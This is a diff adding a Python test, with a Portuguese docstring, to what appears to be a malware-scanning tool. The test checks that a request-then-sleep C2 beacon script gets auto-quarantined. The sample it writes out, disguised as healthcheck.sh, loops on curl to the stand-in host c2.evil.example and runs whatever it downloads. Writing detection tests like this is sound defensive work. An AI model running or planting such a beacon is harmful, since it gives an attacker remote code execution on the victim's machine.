@@ -391,3 +391,66 @@ class TestAutoScanWiring:
             assert any(e.original_path == str(evil) for e in active)
         finally:
             await engine.stop()
+
+    @pytest.mark.asyncio
+    async def test_end_to_end_c2_beacon_request_then_sleep_auto_quarantined(
+        self, tmp_path: Path
+    ) -> None:
+        """Teste intenso de invasão simulada (checklist da tarefa diária,
+        2026-09-16): dropa um script de beacon C2 clássico — check-in via
+        rede, depois dorme, em loop — num diretório monitorado de verdade.
+
+        Achado desta rodada: a regra H019 só casava a ordem "sleep antes
+        de curl/wget/nc" (`ekprotection/heuristics/rules.py`); o padrão
+        real mais comum de beacon (faz a requisição de check-in, DEPOIS
+        dorme, repete) nunca era detectado — um invasor com esse loop
+        passava batido pelas 23 regras. Corrigido pra checar sleep e
+        rede de forma independente de ordem. Achado secundário no mesmo
+        regex: `nc` sem word-boundary batia como substring de palavras
+        comuns (function/sync/balance/announce), gerando falso-positivo
+        crítico (auto-quarentena) em script benigno com sleep + qualquer
+        uma dessas palavras — coberto em
+        tests/test_heuristics.py::TestRuleH019C2Beacon (unit, não
+        precisa do pipeline real pra provar ausência de falso-positivo)."""
+        from ekprotection.logs.models import EventType, QueryFilter
+
+        watched = tmp_path / "watch"
+        watched.mkdir()
+
+        manager = ConfigManager(tmp_path / "config.yaml")
+        manager.load()
+        manager.set("monitor.paths", [str(watched)])
+        manager.set("quarantine.auto_quarantine_critical", True)
+
+        engine = EKEngine(manager)
+        await engine.start()
+        try:
+            evil = watched / "healthcheck.sh"
+            evil.write_bytes(
+                b"#!/bin/bash\n"
+                b"while true; do\n"
+                b"  curl -s http://c2.evil.example/cmd -o /tmp/.c\n"
+                b"  sh /tmp/.c\n"
+                b"  sleep 60\n"
+                b"done\n"
+            )
+
+            quarantined = False
+            for _ in range(50):  # até ~5s
+                await asyncio.sleep(0.1)
+                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
+                match = next((e for e in entries if e.file_path == str(evil)), None)
+                if match is not None and not evil.exists():
+                    quarantined = True
+                    break
+
+            assert quarantined, (
+                "auto-scan detectou mas não quarentenou automaticamente o "
+                "beacon C2 (request-then-sleep) via monitor em tempo real"
+            )
+            assert match.level.value == "CRITICAL"
+
+            active = engine.quarantine.list_active()
+            assert any(e.original_path == str(evil) for e in active)
+        finally:
+            await engine.stop()
